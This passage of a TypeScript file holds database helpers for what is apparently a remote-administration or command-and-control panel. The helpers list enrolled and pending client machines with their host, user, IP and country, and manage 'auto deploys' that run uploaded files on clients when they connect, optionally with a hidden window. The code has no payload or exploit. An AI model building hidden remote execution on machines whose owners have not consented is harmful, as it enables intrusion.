}

export function getAllPushSubscriptions(): PushSubscriptionRecord[] {
  return db
    .query<any>(`SELECT * FROM push_subscriptions`)
    .all()
    .map((r: any) => ({
      id: r.id,
      userId: r.user_id,
      endpoint: r.endpoint,
      p256dh: r.p256dh,
      auth: r.auth,
      createdAt: Number(r.created_at) || 0,
    }));
}

export function getPendingClients(): {
  id: string;
  host: string | null;
  os: string | null;
  user: string | null;
  ip: string | null;
  country: string | null;
  publicKey: string | null;
  keyFingerprint: string | null;
  lastSeen: number;
}[] {
  return db
    .query<any>(
      `SELECT id, host, os, user, ip, country, public_key as publicKey, key_fingerprint as keyFingerprint, last_seen as lastSeen
       FROM clients WHERE enrollment_status='pending' OR enrollment_status IS NULL ORDER BY last_seen DESC`,
    )
    .all()
    .map((r: any) => ({
      id: r.id,
      host: r.host,
      os: r.os,
      user: r.user,
      ip: r.ip,
      country: r.country,
      publicKey: r.publicKey,
      keyFingerprint: r.keyFingerprint,
      lastSeen: Number(r.lastSeen) || 0,
    }));
}

export type AutoDeployTrigger = "on_connect" | "on_first_connect" | "on_connect_once";

export type AutoDeploy = {
  id: string;
  name: string;
  trigger: AutoDeployTrigger;
  filePath: string;
  fileName: string;
  fileSize: number;
  fileOs: string;
  args: string;
  hideWindow: boolean;
  enabled: boolean;
  osFilter: string[];
  createdAt: number;
  updatedAt: number;
};

function mapAutoDeployRow(row: any): AutoDeploy {
  let osFilter: string[] = [];
  try {
    const parsed = JSON.parse(row.os_filter || "[]");
    osFilter = Array.isArray(parsed) ? parsed : [];
  } catch { }
  return {
    id: row.id,
    name: row.name,
    trigger: row.trigger as AutoDeployTrigger,
    filePath: row.file_path,
    fileName: row.file_name,
    fileSize: Number(row.file_size) || 0,
    fileOs: row.file_os || "unknown",
    args: row.args || "",
    hideWindow: row.hide_window === 1,
    enabled: row.enabled === 1,
    osFilter,
    createdAt: Number(row.created_at) || 0,
    updatedAt: Number(row.updated_at) || 0,
  };
}

export function listAutoDeploys(): AutoDeploy[] {
  const rows = db.query<any>(`SELECT * FROM auto_deploys ORDER BY created_at DESC`).all();
  return rows.map(mapAutoDeployRow);
}

export function getAutoDeploysByTrigger(trigger: AutoDeployTrigger): AutoDeploy[] {
  const rows = db
    .query<any>(
      `SELECT * FROM auto_deploys WHERE trigger=? AND enabled=1 ORDER BY created_at ASC`,
    )
    .all(trigger);
  return rows.map(mapAutoDeployRow);
}

export function getAutoDeploy(id: string): AutoDeploy | null {
  const row = db.query<any>(`SELECT * FROM auto_deploys WHERE id=?`).get(id);
  return row ? mapAutoDeployRow(row) : null;
}

export function createAutoDeploy(input: {
  id: string;
  name: string;
  trigger: AutoDeployTrigger;
  filePath: string;
  fileName: string;
  fileSize: number;
  fileOs: string;
  args: string;
  hideWindow: boolean;
  enabled: boolean;
  osFilter: string[];
}): AutoDeploy {
  const now = Date.now();
  db.run(
    `INSERT INTO auto_deploys (id, name, trigger, file_path, file_name, file_size, file_os, args, hide_window, enabled, os_filter, created_at, updated_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    input.id,
    input.name,
    input.trigger,
    input.filePath,
    input.fileName,
    input.fileSize,
    input.fileOs,
    input.args,
    input.hideWindow ? 1 : 0,
    input.enabled ? 1 : 0,
    JSON.stringify(input.osFilter ?? []),
    now,
    now,
  );
  return getAutoDeploy(input.id)!;
}

export function updateAutoDeploy(
  id: string,
  input: Partial<{
    name: string;
    trigger: AutoDeployTrigger;
    args: string;
    hideWindow: boolean;
    enabled: boolean;
    osFilter: string[];
  }>,
): AutoDeploy | null {
  const current = getAutoDeploy(id);
  if (!current) return null;

  const next = {
    name: input.name ?? current.name,
    trigger: (input.trigger ?? current.trigger) as AutoDeployTrigger,
    args: input.args ?? current.args,
    hideWindow: typeof input.hideWindow === "boolean" ? input.hideWindow : current.hideWindow,
    enabled: typeof input.enabled === "boolean" ? input.enabled : current.enabled,
    osFilter: Array.isArray(input.osFilter) ? input.osFilter : current.osFilter,
  };

  db.run(
    `UPDATE auto_deploys SET name=?, trigger=?, args=?, hide_window=?, enabled=?, os_filter=?, updated_at=? WHERE id=?`,
    next.name,
    next.trigger,
    next.args,
    next.hideWindow ? 1 : 0,
    next.enabled ? 1 : 0,
    JSON.stringify(next.osFilter),
    Date.now(),
    id,
  );

  return getAutoDeploy(id);
}

export function deleteAutoDeploy(id: string): boolean {
  const result = db.run(`DELETE FROM auto_deploys WHERE id=?`, id);
  db.run(`DELETE FROM auto_deploy_runs WHERE deploy_id=?`, id);
  return (result as any)?.changes ? (result as any).changes > 0 : true;
}

export function hasAutoDeployRun(deployId: string, clientId: string): boolean {
  const row = db
    .query<any>(
      `SELECT deploy_id FROM auto_deploy_runs WHERE deploy_id=? AND client_id=?`,
    )
    .get(deployId, clientId);
  return !!row?.deploy_id;
}

export function recordAutoDeployRun(deployId: string, clientId: string) {
  db.run(
    `INSERT OR REPLACE INTO auto_deploy_runs (deploy_id, client_id, ts) VALUES (?, ?, ?)`,
    deployId,
    clientId,
    Date.now(),
  );
}
